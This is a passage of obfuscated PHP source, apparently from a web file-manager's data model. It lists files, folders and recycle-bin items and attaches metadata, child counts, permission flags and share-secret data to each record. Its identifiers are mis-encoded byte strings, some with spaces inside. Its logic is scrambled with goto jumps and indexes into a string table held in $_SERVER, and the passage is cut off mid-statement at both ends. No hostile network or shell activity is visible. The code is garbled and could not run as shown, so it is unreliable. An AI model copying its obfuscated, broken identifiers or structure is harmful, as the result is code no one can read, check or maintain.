dÙ◊ªâÆÚº: $D¿‚»˘ª·í =& $_SERVER[™⁄»üÆ]; if ($EÔÿÔ∂…˜Ω && !is_array($EÔÿÔ∂…˜Ω)) { $EÔÿÔ∂…˜Ω = array($EÔÿÔ∂…˜Ω); } $b¡•⁄ıñí” = Model($D¿‚»˘ª·í[419])->listData(); goto c®ùäπòøÑ; EëÿêˆÑ£Ü: if ($Eâ‚Í¡«ê¶) { Model($D¿‚»˘ª·í[421])->removeBySource($Eâ‚Í¡«ê¶); } return $aó·®◊ßÏñ; goto BÕàÖ˜‡≥£; BÕàÖ˜‡≥£: } public function listUserRecycle() { $F‚üó‰ËÙñ =& $_SERVER[™⁄»üÆ]; $cüòöÿŸâ“ = Model($F‚üó‰ËÙñ[422])->listData(); if (!$cüòöÿŸâ“) { return array(); } $B≈ì¶›éª± = array($F‚üó‰ËÙñ[411] => array($F‚üó‰ËÙñ[412], $cüòöÿŸâ“), $F‚üó‰ËÙñ[423] => 1); return $this->listSource($B≈ì¶›éª±); } public function listSource($Eß à„´œ†, $eÖç‡¬∫ª† = 3000) { goto Fˆ·Ì¢¥ê≈; a‡Üàòÿ≥ù: $bÚÑâ¡·Ø£ = $this->field($eüØ◊ë·Îï)->_makeOrder()->where($Eß à„´œ†)->selectPage($eÖç‡¬∫ª†); $this->_listDataApply($bÚÑâ¡·Ø£[$f∂˜Áîõ„ú[367]]); $this->_listMake($bÚÑâ¡·Ø£); goto cÖÉ≤‡ùâ°; cÖÉ≤‡ùâ°: return $bÚÑâ¡·Ø£; goto FˆÎ‹‘¢∫“; Fˆ·Ì¢¥ê≈: $f∂˜Áîõ„ú =& $_SERVER[™⁄»üÆ]; if (!isset($Eß à„´œ†[$f∂˜Áîõ„ú[424]])) { $Eß à„´œ†[$f∂˜Áîõ„ú[424]] = 0; } $eüØ◊ë·Îï = $f∂˜Áîõ„ú[425]; goto a‡Üàòÿ≥ù; FˆÎ‹‘¢∫“: } protected function _makeOrder() { goto aáÂÑö∑±; Eô—∆ëÖåÇ: $A⁄⁄çÓäÊ¡ = Input::get($eêÇÛ›∂Ó”[437], $eêÇÛ›∂Ó”[7], $f•µó±ı©ú, array_keys($bÎâÎﬂù¿ö)); if (!in_array($C¶ÉõÉ∏øﬁ, array_keys($c≤âªÉ™à¬))) { $C¶ÉõÉ∏øﬁ = $eêÇÛ›∂Ó”[28]; } if (!in_array($A⁄⁄çÓäÊ¡, array_keys($bÎâÎﬂù¿ö))) { $C¶ÉõÉ∏øﬁ = $eêÇÛ›∂Ó”[429]; } goto Bƒùß‹¥ù˜; Bƒùß‹¥ù˜: if ($C¶ÉõÉ∏øﬁ == $eêÇÛ›∂Ó”[28]) { } $bπä£á∆Àﬂ = $eêÇÛ›∂Ó”[438] . $c≤âªÉ™à¬[$C¶ÉõÉ∏øﬁ] . $eêÇÛ›∂Ó”[50] . $bÎâÎﬂù¿ö[$A⁄⁄çÓäÊ¡]; return $this->order(rtrim(trim($bπä£á∆Àﬂ), $eêÇÛ›∂Ó”[47])); goto f‰øÆä¨¢Ò; f¯òô€â∂˘: $bÎâÎﬂù¿ö = array($eêÇÛ›∂Ó”[429] => $eêÇÛ›∂Ó”[430], $eêÇÛ›∂Ó”[431] => $eêÇÛ›∂Ó”[432]); $c≤âªÉ™à¬ = array($eêÇÛ›∂Ó”[28] => $eêÇÛ›∂Ó”[28], $eêÇÛ›∂Ó”[78] => $eêÇÛ›∂Ó”[78], $eêÇÛ›∂Ó”[168] => $eêÇÛ›∂Ó”[406], $eêÇÛ›∂Ó”[433] => $eêÇÛ›∂Ó”[433], $eêÇÛ›∂Ó”[434] => $eêÇÛ›∂Ó”[435], $eêÇÛ›∂Ó”[194] => $eêÇÛ›∂Ó”[194], $eêÇÛ›∂Ó”[84] => $eêÇÛ›∂Ó”[84]); $C¶ÉõÉ∏øﬁ = Input::get($eêÇÛ›∂Ó”[436], $eêÇÛ›∂Ó”[7], $fÇÂﬂë◊ïÔ, array_keys($c≤âªÉ™à¬)); goto Eô—∆ëÖåÇ; aáÂÑö∑±: $eêÇÛ›∂Ó” =& $_SERVER[™⁄»üÆ]; $fÇÂﬂë◊ïÔ = Model($eêÇÛ›∂Ó”[426])->get($eêÇÛ›∂Ó”[427]); $f•µó±ı©ú = Model($eêÇÛ›∂Ó”[426])->get($eêÇÛ›∂Ó”[428]); goto f¯òô€â∂˘; f‰øÆä¨¢Ò: } protected function _listDataApplyItem($a∑Û√—Ô‰ë, $A„»—Ö´Ÿ‘ = false) { $dÆ˜‰∆ê¥≤ = array($a∑Û√—Ô‰ë); $this->_listDataApply($dÆ˜‰∆ê¥≤, $A„»—Ö´Ÿ‘); return $dÆ˜‰∆ê¥≤[0]; } protected function _listDataApply(&$c†âÌñÛ∏, $a¥Ú€¶ÖóÃ = false) { goto d®á®¢ÍÉº; bœãÂ´“Ú–: $this->_listAppendPath($c†âÌñÛ∏); $this->_listAppendAuth($c†âÌñÛ∏); $this->_listAppendSourceInfo($c†âÌñÛ∏, $fƒ±É¶‚†—); goto fê©î›Ñõı; AÒÑ”ÊñÊç: $fƒ±É¶‚†— = array_unique($fƒ±É¶‚†—); $this->_listSourceCache($c†âÌñÛ∏); if (!$a¥Ú€¶ÖóÃ) { $this->_listAppendMeta($c†âÌñÛ∏, $fƒ±É¶‚†—); $this->_listAppendFileMeta($c†âÌñÛ∏, $fƒ±É¶‚†—); $this->_listAppendChildren($c†âÌñÛ∏, $fƒ±É¶‚†—); } goto bœãÂ´“Ú–; d®á®¢ÍÉº: $côèù’™Ê∏ =& $_SERVER[™⁄»üÆ]; if (!$c†âÌñÛ∏) { $c†âÌñÛ∏ = array(); return; } $fƒ±É¶‚†— = array_to_keyvalue($c†âÌñÛ∏, $côèù’™Ê∏[33], $côèù’™Ê∏[396]); goto AÒÑ”ÊñÊç; fê©î›Ñõı: $this->_listAppendUser($c†âÌñÛ∏); $this->_listFilterInfo($c†âÌñÛ∏, $a¥Ú€¶ÖóÃ); $this->_listAppendAuthSecret($c†âÌñÛ∏); goto Aç·••íà; Aç·••íà: } protected function _listSourceCache($dØÍﬂç∫É¥) { $E¢≥¿◊›„” =& $_SERVER[™⁄»üÆ]; foreach ($dØÍﬂç∫É¥ as $Dè◊≥°î˜„) { self::$cacheSourceInfo[$E¢≥¿◊›„”[439] . $Dè◊≥°î˜„[$E¢≥¿◊›„”[396]]] = $Dè◊≥°î˜„; } } protected function _listFilterInfo(&$FˆÛèÜºá—, $DÀóëÏñ≠◊ = false) { $C˜ÑÒÇ’ñö =& $_SERVER[™⁄»üÆ]; foreach ($FˆÛèÜºá— as &$dê≥“ ﬂ«ò) { $dê≥“ ﬂ«ò = $this->pathInfoFilter($dê≥“ ﬂ«ò); self::$cachePathInfo[$C˜ÑÒÇ’ñö[440] . intval($DÀóëÏñ≠◊) . $C˜ÑÒÇ’ñö[441] . $dê≥“ ﬂ«ò[$C˜ÑÒÇ’ñö[396]]] = $dê≥“ ﬂ«ò; } unset($dê≥“ ﬂ«ò); } protected function _listMake(&$aòì˘ªÖõú) { $aÂ⁄†ôÎá± =& $_SERVER[™⁄»üÆ]; $aòì˘ªÖõú[$aÂ⁄†ôÎá±[75]] = array(); $aòì˘ªÖõú[$aÂ⁄†ôÎá±[74]] = array(); foreach ($aòì˘ªÖõú[$aÂ⁄†ôÎá±[367]] as $f–¥˘âÜõ) { $dÜèòï‚œ“ = $f–¥˘âÜõ[$aÂ⁄†ôÎá±[404]] == 1 ? $aÂ⁄†ôÎá±[75] : $aÂ⁄†ôÎá±[74]; $aòì˘ªÖõú[$dÜèòï‚œ“][] = $f–¥˘âÜõ; } unset($aòì˘ªÖõú[$aÂ⁄†ôÎá±[367]]); } protected function _listAppendMeta(&$B∂æ°–˜Õè, $F¢‚´∂‡¬·) { goto DË¡÷Â“ÿÜ; A¬à‘üèå: if (!$Aﬁ˜í–ÆÒä) { return; } $A¨¿ËÖìıØ = array($b‹‘πàø∆[444], $b‹‘πàø∆[445]); $bíñ°É‡≤£ = array(); goto b¢†Ãòï“†; b¢†Ãòï“†: foreach ($Aﬁ˜í–ÆÒä as $DƒÔéÚ∑ãŒ) { if (!isset($bíñ°É‡≤£[$DƒÔéÚ∑ãŒ[$b‹‘πàø∆[396]]])) { $bíñ°É‡≤£[$DƒÔéÚ∑ãŒ[$b‹‘πàø∆[396]]] = array(); } if (in_array($DƒÔéÚ∑ãŒ[$b‹‘πàø∆[93]], $A¨¿ËÖìıØ)) { continue; } $bíñ°É‡≤£[$DƒÔéÚ∑ãŒ[$b‹‘πàø∆[396]]][$DƒÔéÚ∑ãŒ[$b‹‘πàø∆[93]]] = $DƒÔéÚ∑ãŒ[$b‹‘πàø∆[372]]; } foreach ($B∂æ°–˜Õè as &$E∞ Ÿèœ´Ø) { $E∞ Ÿèœ´Ø[$b‹‘πàø∆[446]] = !1; if (isset($bíñ°É‡≤£[$E∞ Ÿèœ´Ø[$b‹‘πàø∆[396]]])) { $E∞ Ÿèœ´Ø[$b‹‘πàø∆[446]] = $bíñ°É‡≤£[$E∞ Ÿèœ´Ø[$b‹‘πàø∆[396]]]; } if ($this->fileIsLock($E∞ Ÿèœ´Ø) && $E∞ Ÿèœ´Ø[$b‹‘πàø∆[407]]) { $Aø‰¯«âàÏ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $E∞ Ÿèœ´Ø[$b‹‘πàø∆[407]][$b‹‘πàø∆[408]] = AuthModel::authDisable($E∞ Ÿèœ´Ø[$b‹‘πàø∆[407]][$b‹‘πàø∆[408]], $Aø‰¯«âàÏ); $E∞ Ÿèœ´Ø[$b‹‘πàø∆[407]][$b‹‘πàø∆[447]][$b‹‘πàø∆[407]] = $E∞ Ÿèœ´Ø[$b‹‘πàø∆[407]][$b‹‘πàø∆[408]]; } } unset($E∞ Ÿèœ´Ø); goto AÚÂöÎçÇı; DË¡÷Â“ÿÜ: $b‹‘πàø∆ =& $_SERVER[™⁄»üÆ]; $Dœ™◊Ñ£€± = array($b‹‘πàø∆[411] => array($b‹‘πàø∆[412], $F¢‚´∂‡¬·)); $Aﬁ˜í–ÆÒä = Model($b‹‘πàø∆[442])->field($b‹‘πàø∆[443])->where($Dœ™◊Ñ£€±)->select(); goto A¬à‘üèå; AÚÂöÎçÇı: } protected function _listAppendFileMeta(&$Fàæ⁄ºŸ‚Ô, $bÂñÛ»Õ”ó) { goto cÚü√Êêæÿ; c◊¨ë‹Ê’ï: if (!$C¢œË‡ßÏﬂ) { return; } $dí™ØÜªöÙ = array($f¬ÜÆ≥€≤à[449] => array($f¬ÜÆ≥€≤à[412], $C¢œË‡ßÏﬂ)); $D¬óØÔ≈ß∑ = $f¬ÜÆ≥€≤à[450]; goto DçÍöÏ§…ê; DçÍöÏ§…ê: $a°ã∑é◊Ÿœ = Model($f¬ÜÆ≥€≤à[451])->field($D¬óØÔ≈ß∑)->where($dí™ØÜªöÙ)->select(); $a°ã∑é◊Ÿœ = array_to_keyvalue($a°ã∑é◊Ÿœ, $f¬ÜÆ≥€≤à[448]); $f¿ñ‡ºÉüû = Model($f¬ÜÆ≥€≤à[452])->field($f¬ÜÆ≥€≤à[453])->where($dí™ØÜªöÙ)->select(); goto båÑå∂®òÑ; cÚü√Êêæÿ: $f¬ÜÆ≥€≤à =& $_SERVER[™⁄»üÆ]; $C¢œË‡ßÏﬂ = array_to_keyvalue($Fàæ⁄ºŸ‚Ô, $f¬ÜÆ≥€≤à[33], $f¬ÜÆ≥€≤à[448]); $C¢œË‡ßÏﬂ = array_filter(array_unique($C¢œË‡ßÏﬂ)); goto c◊¨ë‹Ê’ï; a†¨¡¢”ó¥: foreach ($Fàæ⁄ºŸ‚Ô as &$A»Íì±∑ü€) { goto dùéÈﬂƒ≠π; dùéÈﬂƒ≠π: $BöÀÔµ†‚õ = $A»Íì±∑ü€[$f¬ÜÆ≥€≤à[448]]; if (!$BöÀÔµ†‚õ || !is_array($a°ã∑é◊Ÿœ[$BöÀÔµ†‚õ])) { continue; } $d°πÇ·´âÉ = $a°ã∑é◊Ÿœ[$BöÀÔµ†‚õ]; goto f≠…ô∏≈Ò; EÍ¢ø®ëø¬: unset($a°ã∑é◊Ÿœ[$BöÀÔµ†‚õ][$f¬ÜÆ≥€≤à[76]]); $Cè±Ñâœà≥ = is_array($FŒÌ•›Éå“[$BöÀÔµ†‚õ]) ? $FŒÌ•›Éå“[$BöÀÔµ†‚õ] : array(); $A»Íì±∑ü€[$f¬ÜÆ≥€≤à[164]] = array_merge($Cè±Ñâœà≥, $a°ã∑é◊Ÿœ[$BöÀÔµ†‚õ]); goto cÇè∞ñ¶≤≥; cÇè∞ñ¶≤≥: if (isset($A»Íì±∑ü€[$f¬ÜÆ≥€≤à[164]][$f¬ÜÆ≥€≤à[163]])) { $A»Íì±∑ü€[$f¬ÜÆ≥€≤à[163]] = json_decode($A»Íì±∑ü€[$f¬ÜÆ≥€≤à[164]][$f¬ÜÆ≥€≤à[163]], !0); unset($A»Íì±∑ü€[$f¬ÜÆ≥€≤à[164]][$f¬ÜÆ≥€≤à[163]]); } goto döã°ÍñŸπ; f≠…ô∏≈Ò: $d°πÇ·´âÉ[$f¬ÜÆ≥€≤à[78]] = $A»Íì±∑ü€[$f¬ÜÆ≥€≤à[78]]; $d°πÇ·´âÉ[$f¬ÜÆ≥€≤à[28]] = $A»Íì±∑ü€[$f¬ÜÆ≥€≤à[28]]; if (!isset(self::$cacheFileInfo[$f¬ÜÆ≥€≤à[454] . $BöÀÔµ†‚õ])) { self::$cacheFileInfo[$f¬ÜÆ≥€≤à[454] . $BöÀÔµ†‚õ] = array_merge(array(), $d°πÇ·´âÉ); } goto EÍ¢ø®ëø¬; döã°ÍñŸπ: } unset($A»Íì±∑ü€); goto fÔ†íÈ—ãä; båÑå∂®òÑ: $f¿ñ‡ºÉüû = $f¿ñ‡ºÉüû ? $f¿ñ‡ºÉüû : array(); $FŒÌ•›Éå“ = array(); foreach ($f¿ñ‡ºÉüû as $EíÙÕÆ†¨◊) { if (!isset($FŒÌ•›Éå“[$EíÙÕÆ†¨◊[$f¬ÜÆ≥€≤à[448]]])) { $FŒÌ•›Éå“[$EíÙÕÆ†¨◊[$f¬ÜÆ≥€≤à[448]]] = array(); } $FŒÌ•›Éå“[$EíÙÕÆ†¨◊[$f¬ÜÆ≥€≤à[448]]][$EíÙÕÆ†¨◊[$f¬ÜÆ≥€≤à[93]]] = $EíÙÕÆ†¨◊[$f¬ÜÆ≥€≤à[372]]; } goto a†¨¡¢”ó¥; fÔ†íÈ—ãä: } protected function _listAppendSourceInfo(&$E∏àÙåü·÷, $AÎì‘≈çôœ) { goto BÎ¥…ﬁï±É; Eª≈°ƒìáæ: $CÉ–≥éí◊ﬂ = array_to_keyvalue($D§∫â”â„å, $Dû‘’â∑◊†[394]); $Aœ˘‰Ê”éã = array_to_keyvalue_group($càêí˜ï‹ê, $Dû‘’â∑◊†[76], $Dû‘’â∑◊†[420]); $eÕœ…ËÍﬁÈ = array_to_keyvalue($DÉà‰¯ÕÊ—, $Dû‘’â∑◊†[76]); goto C›∏®ÈÜ‹Õ; B–”·Üîº˜: return $E∏àÙåü·÷; goto câµéêæÔÎ; C›∏®ÈÜ‹Õ: $D€‚¨µãè√ = array_to_keyvalue_group($bªí¢∞¯Ì , $Dû‘’â∑◊†[396]); foreach ($E∏àÙåü·÷ as &$FÒõˆ•àà¡) { $FÒõˆ•àà¡[$Dû‘’â∑◊†[85]] = array($Dû‘’â∑◊†[458] => 0, $Dû‘’â∑◊†[459] => 0, $Dû‘’â∑◊†[460] => 0); if (isset($eÕœ…ËÍﬁÈ[$FÒõˆ•àà¡[$Dû‘’â∑◊†[396]]])) { $FÒõˆ•àà¡[$Dû‘’â∑◊†[85]][$Dû‘’â∑◊†[461]] = 1; $FÒõˆ•àà¡[$Dû‘’â∑◊†[85]][$Dû‘’â∑◊†[462]] = $eÕœ…ËÍﬁÈ[$FÒõˆ•àà¡[$Dû‘’â∑◊†[396]]][$Dû‘’â∑◊†[28]]; } if (isset($Aœ˘‰Ê”éã[$FÒõˆ•àà¡[$Dû‘’â∑◊†[396]]])) { $FÒõˆ•àà¡[$Dû‘’â∑◊†[85]][$Dû‘’â∑◊†[463]] = array(); foreach ($Aœ˘‰Ê”éã[$FÒõˆ•àà¡[$Dû‘’â∑◊†[396]]] as $cº‘Øõ˘íÌ) { $f∑Ùë—É Ì = $CÉ–≥éí◊ﬂ[$cº‘Øõ˘íÌ]; $FÒõˆ•àà¡[$Dû‘’â∑◊†[85]][$Dû‘’â∑◊†[463]][] = array($Dû‘’â∑◊†[464] => $f∑Ùë—É Ì[$Dû‘’â∑◊†[394]], $Dû‘’â∑◊†[414] => $f∑Ùë—É Ì[$Dû‘’â∑◊†[28]], $Dû‘’â∑◊†[465] => $f∑Ùë—É Ì[$Dû‘’â∑◊†[466]]); } } if (isset($D€‚¨µãè√[$FÒõˆ•àà¡[$Dû‘’â∑◊†[396]]])) { $FÒõˆ•àà¡[$Dû‘’â∑◊†[85]][$Dû‘’â∑◊†[467]] = array(); foreach ($D€‚¨µãè√[$FÒõˆ•àà¡[$Dû‘’â∑◊†[396]]] as $aÉªÁ±À) { $FÒõˆ•àà¡[$Dû‘’â∑◊†[85]][$Dû‘’â∑◊†[467]] = array($Dû‘’â∑◊†[468] => $aÉªÁ±À[$Dû‘’â∑◊†[469]], $Dû‘’â∑◊†[470] => $aÉªÁ±À[$Dû‘’â∑◊†[471]], $Dû‘’â∑◊†[472] => $aÉªÁ±À[$Dû‘’â∑◊†[396]], $Dû‘’â∑◊†[473] => $aÉªÁ±À[$Dû‘’â∑◊†[474]], $Dû‘’â∑◊†[475] => $aÉªÁ±À[$Dû‘’â∑◊†[476]], $Dû‘’â∑◊†[477] => $aÉªÁ±À[$Dû‘’â∑◊†[477]], $Dû‘’â∑◊†[478] => $aÉªÁ±À[$Dû‘’â∑◊†[478]]); } } } unset($FÒõˆ•àà¡); goto B–”·Üîº˜; BÎ¥…ﬁï±É: $Dû‘’â∑◊† =& $_SERVER[™⁄»üÆ]; if (!defined($Dû‘’â∑◊†[455])) { return; } $D§∫â”â„å = Model($Dû‘’â∑◊†[456])->listData(); goto EÀ—€í‘¿í; EÀ—€í‘¿í: $càêí˜ï‹ê = Model($Dû‘’â∑◊†[419])->listData(); $DÉà‰¯ÕÊ— = Model($Dû‘’â∑◊†[409])->listData(); $bªí¢∞¯Ì  = Model($Dû‘’â∑◊†[457])->listSimple(); goto Eª≈°ƒìáæ; câµéêæÔÎ: } protected function _listAppendChildren(&$E«∏õâ∆‚É, $C€†ò’å∞‰) { goto CÊˆ»‹ãæ’; A‡≥è∑ Ìœ: foreach ($E«∏õâ∆‚É as &$aΩ∂Ìè›ïà) { if (!$aΩ∂Ìè›ïà[$c∑ÏÌ„©ÈÑ[404]]) { continue; } $e⁄©òÍÌ¢¥[] = $aΩ∂Ìè›ïà[$c∑ÏÌ„©ÈÑ[396]]; } unset($aΩ∂Ìè›ïà); if (!$e⁄©òÍÌ¢¥) { return; } goto F’èáïúù; CÉ»Îå≤≥Ö: unset($aΩ∂Ìè›ïà); goto E…Ùâ◊ò˜; F’èáïúù: $dÏÜòÎäïÌ = array($c∑ÏÌ„©ÈÑ[479] => array($c∑ÏÌ„©ÈÑ[7], $e⁄©òÍÌ¢¥)); $CÉÖ„•∞î∑ = array($c∑ÏÌ„©ÈÑ[479], $c∑ÏÌ„©ÈÑ[404], $c∑ÏÌ„©ÈÑ[480] => $c∑ÏÌ„©ÈÑ[481]); $dè‰âáì¥º = $this->field($CÉÖ„•∞î∑)->where($dÏÜòÎäïÌ)->group($c∑ÏÌ„©ÈÑ[482])->select(); goto Eì¨è˜Ûàà; Eì¨è˜Ûàà: $b÷ïËË¶Ï¶ = array(); foreach ($dè‰âáì¥º as $Dà¢‰Íˆ©ä) { $BÉ≈ûÜî¿ã = $Dà¢‰Íˆ©ä[$c∑ÏÌ„©ÈÑ[479]]; $d¶ÈáÌ˘òˆ = $Dà¢‰Íˆ©ä[$c∑ÏÌ„©ÈÑ[404]] == $c∑ÏÌ„©ÈÑ[87] ? $c∑ÏÌ„©ÈÑ[204] : $c∑ÏÌ„©ÈÑ[203]; if (!isset($b÷ïËË¶Ï¶[$BÉ≈ûÜî¿ã])) { $b÷ïËË¶Ï¶[$BÉ≈ûÜî¿ã] = array($c∑ÏÌ„©ÈÑ[203] => 0, $c∑ÏÌ„©ÈÑ[204] => 0); } $b÷ïËË¶Ï¶[$BÉ≈ûÜî¿ã][$d¶ÈáÌ˘òˆ] += $Dà¢‰Íˆ©ä[$c∑ÏÌ„©ÈÑ[481]]; } foreach ($E«∏õâ∆‚É as &$aΩ∂Ìè›ïà) { if (!$aΩ∂Ìè›ïà[$c∑ÏÌ„©ÈÑ[404]]) { continue; } $Däõ÷ò¬Æµ = is_array($b÷ïËË¶Ï¶[$aΩ∂Ìè›ïà[$c∑ÏÌ„©ÈÑ[396]]]) ? $b÷ïËË¶Ï¶[$aΩ∂Ìè›ïà[$c∑ÏÌ„©ÈÑ[396]]] : $eÁ¿Îòëü«; $aΩ∂Ìè›ïà[$c∑ÏÌ„©ÈÑ[204]] = $Däõ÷ò¬Æµ[$c∑ÏÌ„©ÈÑ[204]]; $aΩ∂Ìè›ïà[$c∑ÏÌ„©ÈÑ[203]] = $Däõ÷ò¬Æµ[$c∑ÏÌ„©ÈÑ[203]]; unset($aΩ∂Ìè›ïà[$c∑ÏÌ„©ÈÑ[406]]); } goto CÉ»Îå≤≥Ö; CÊˆ»‹ãæ’: $c∑ÏÌ„©ÈÑ =& $_SERVER[™⁄»üÆ]; $e⁄©òÍÌ¢¥ = array(); $eÁ¿Îòëü« = array($c∑ÏÌ„©ÈÑ[203] => 0, $c∑ÏÌ„©ÈÑ[204] => 0); goto A‡≥è∑ Ìœ; E…Ùâ◊ò˜: } protected function _listAppendAuth(&$DÆô◊‘µ©ê) { goto BÕ›ûﬁï”±; BÕ›ûﬁï”±: $E‡πäëÑ§ë =& $_SERVER[™⁄»üÆ]; if (!defined($E‡πäëÑ§ë[455])) { return; } $eÁËèáó»Ã = array(); goto dè§¿‘ôÈ◊; dè§¿‘ôÈ◊: foreach ($DÆô◊‘µ©ê as $E≥⁄ü÷ÑÚ) { if ($E≥⁄ü÷ÑÚ[$E‡πäëÑ§ë[405]] == self::TYPE_GROUP) { $eÁËèáó»Ã[] = $E≥⁄ü÷ÑÚ[$E‡πäëÑ§ë[396]]; } } if (!$eÁËèáó»Ã) { return; } $fÁüéèª∂√ = array_to_keyvalue($DÆô◊‘µ©ê, $E‡πäëÑ§ë[396]); goto EÊŒâóÔƒ‘; EÊŒâóÔƒ‘: $cè≥î‰‹† = Model($E‡πäëÑ§ë[483])->getSourceList($eÁËèáó»Ã, $fÁüéèª∂√); foreach ($DÆô◊‘µ©ê as $d—˘ä§·πÇ => &$E≥⁄ü÷ÑÚ) { $E≥⁄ü÷ÑÚ[$E‡πäëÑ§ë[407]] = $cè≥î‰‹†[$E≥⁄ü÷ÑÚ[$E‡πäëÑ§ë[396]]]; if (!$E≥⁄ü÷ÑÚ[$E‡πäëÑ§ë[407]] && $E≥⁄ü÷ÑÚ[$E‡πäëÑ§ë[405]] == self::TYPE_GROUP) { $E≥⁄ü÷ÑÚ[$E‡πäëÑ§ë[407]] = Action($E‡πäëÑ§ë[484])->pathGroupAuthMake($E≥⁄ü÷ÑÚ[$E‡πäëÑ§ë[485]]); if (!$E≥⁄ü÷ÑÚ[$E‡πäëÑ§ë[407]] && !_get($GLOBALS, $E‡πäëÑ§ë[486])) { $E≥⁄ü÷ÑÚ[$E‡πäëÑ§ë[196]] = !1; $E≥⁄ü÷ÑÚ[$E‡πäëÑ§ë[195]] = !1; } } if ($E≥⁄ü÷ÑÚ[$E‡πäëÑ§ë[407]]) { $E≥⁄ü÷ÑÚ[$E‡πäëÑ§ë[196]] = AuthModel::authCheckEdit($E≥⁄ü÷ÑÚ[$E‡πäëÑ§ë[407]][$E‡πäëÑ§ë[408]]); $E≥⁄ü÷ÑÚ[$E‡πäëÑ§ë[195]] = AuthModel::authCheckView($E≥⁄ü÷ÑÚ[$E‡πäëÑ§ë[407]][$E‡πäëÑ§ë[408]]); } $this->groupPathDisplay($E≥⁄ü÷ÑÚ); } unset($E≥⁄ü÷ÑÚ); goto AúÃÓ»‚˘ô; AúÃÓ»‚˘ô: } public function _listAppendAuthSecret(&$Fø´÷†ŸÜê) { goto D—àÖï◊áù; EÒåÚ™«“ã: if (!$eâñ∆’áîº) { goto cﬁéé†™ÇÆ; cﬁéé†™ÇÆ: $CœÊå∑≥óı = Model($BÍ–ÿÁÁŸê[489]); $f“ô¶ÿÊ» = Model($BÍ–ÿÁÁŸê[490]); $eâñ∆’áîº = $f“ô¶ÿÊ»->listData(); goto AÙÊÑ≥ë◊¶; däîåãÊ≥‘: foreach ($eâñ∆’áîº as $cÖº¡©Õ†Ø => $D◊àà≠äû”) { goto FÙ„—€Á»Ô; eÂ∂‚áﬁ«Í: $D◊àà≠äû”[$BÍ–ÿÁÁŸê[494]] = Model($BÍ–ÿÁÁŸê[495])->getInfoSimpleOuter($D◊àà≠äû”[$BÍ–ÿÁÁŸê[433]]); $eâñ∆’áîº[$cÖº¡©Õ†Ø] = $D◊àà≠äû”; goto b÷æ ™¥‡ß; FÙ„—€Á»Ô: $Cπ¢ê≤“≤Ñ = $a“ˆ≥¡©Ó…[$D◊àà≠äû”[$BÍ–ÿÁÁŸê[492]]]; if (!$Cπ¢ê≤“≤Ñ) { $f“ô¶ÿÊ»->remove($D◊àà≠äû”[$BÍ–ÿÁÁŸê[394]]); unset($eâñ∆’áîº[$cÖº¡©Õ†Ø]); continue; } $EâÒÛäà∂¥ = $CœÊå∑≥óı->listData($Cπ¢ê≤“≤Ñ[$BÍ–ÿÁÁŸê[407]]); goto c»Ì€‚¥úÒ; c»Ì€‚¥úÒ: if (!$EâÒÛäà∂¥) { $f“ô¶ÿÊ»->remove($D◊àà≠äû”[$BÍ–ÿÁÁŸê[394]]); unset($eâñ∆’áîº[$cÖº¡©Õ†Ø]); continue; } $D◊àà≠äû”[$BÍ–ÿÁÁŸê[407]] = $EâÒÛäà∂¥; $D◊àà≠äû”[$BÍ–ÿÁÁŸê[493]] = $Cπ¢ê≤“≤Ñ; goto eÂ∂‚áﬁ«Í; b÷æ ™¥‡ß: } goto b›÷ﬂâü±Â; AÙÊÑ≥ë◊¶: $eâñ∆’áîº = array_to_keyvalue($eâñ∆’áîº, $BÍ–ÿÁÁŸê[396]); $a“ˆ≥¡©Ó… = json_decode(Model($BÍ–ÿÁÁŸê[487])->get($BÍ–ÿÁÁŸê[491]), !0); $a“ˆ≥¡©Ó… = array_to_keyvalue($a“ˆ≥¡©Ó…, $BÍ–ÿÁÁŸê[394]); goto däîåãÊ≥‘; b›÷ﬂâü±Â: } $eÿÜòÙè€“ = defined($BÍ–ÿÁÁŸê[496]) ? USER_ID : $BÍ–ÿÁÁŸê[33]; $A É‘∞ï¿ï = array(); goto b–îçäìÀ¿; D—àÖï◊áù: $BÍ–ÿÁÁŸê =& $_SERVER[™⁄»üÆ]; if (Model($BÍ–ÿÁÁŸê[487])->get($BÍ–ÿÁÁŸê[488]) != $BÍ–ÿÁÁŸê[87]) { return; } static $eâñ∆’áîº = false; goto EÒåÚ™«“ã; b–îçäìÀ¿: $aµ¬Ö∞çÇï = $this->_listAppendPath($A É‘∞ï¿ï, !0); foreach ($Fø´÷†ŸÜê as $cÖº¡©Õ†Ø => &$D◊àà≠äû”) { if (!is_array($D◊àà≠äû”[$BÍ–ÿÁÁŸê[407]])) { continue; } if ($D◊àà≠äû”[$BÍ–ÿÁÁŸê[405]] != $BÍ–ÿÁÁŸê[497]) { continue; } if (isset($eâñ∆’áîº[$D◊àà≠äû”[$BÍ–ÿÁÁŸê[396]]])) { goto cÎ¥®Ÿæëä; cåà‡¯ä¢„: if ($E≤‚¢Ê∞ÙÙ[$BÍ–ÿÁÁŸê[433]] != $eÿÜòÙè€“) { $D◊àà≠äû”[$BÍ–ÿÁÁŸê[407]][$BÍ–ÿÁÁŸê[408]] = $D◊àà≠äû”[$BÍ–ÿÁÁŸê[407]][$BÍ–ÿÁÁŸê[408]] & $E≤‚¢Ê∞ÙÙ[$BÍ–ÿÁÁŸê[407]][$BÍ–ÿÁÁŸê[407]]; } continue; goto a⁄¢Öÿß„Ë; cÎ¥®Ÿæëä: $E≤‚¢Ê∞ÙÙ = $eâñ∆’áîº[$D◊àà≠äû”[$BÍ–ÿÁÁŸê[396]]]; if (!is_array($D◊àà≠äû”[$BÍ–ÿÁÁŸê[446]])) { $D◊àà≠äû”[$BÍ–ÿÁÁŸê[446]] = array(); } $D◊àà≠äû”[$BÍ–ÿÁÁŸê[446]][$BÍ–ÿÁÁŸê[498]] = $E≤‚¢Ê∞ÙÙ[$BÍ–ÿÁÁŸê[492]]; goto C©≤£üıü‹; C©≤£üıü‹: $D◊àà≠äû”[$BÍ–ÿÁÁŸê[407]][$BÍ–ÿÁÁŸê[499]] = $E≤‚¢Ê∞ÙÙ; $D◊àà≠äû”[$BÍ–ÿÁÁŸê[407]][$BÍ–ÿÁÁŸê[500]] = $D◊àà≠äû”[$BÍ–ÿÁÁŸê[501]]; $D◊àà≠äû”[$BÍ–ÿÁÁŸê[407]][$BÍ–ÿÁÁŸê[502]] = $BÍ–ÿÁÁŸê[87]; goto cåà‡¯ä¢„; a⁄¢Öÿß„Ë: } $e°ó◊û¢∆ = $this->parentLevelArray($D◊àà≠äû”[$BÍ–ÿÁÁŸê[503]]); $aﬁÖÛöç”© = array_reverse($e°ó◊û¢∆); foreach ($aﬁÖÛöç”© as $EÈ®¢ÃıÒå 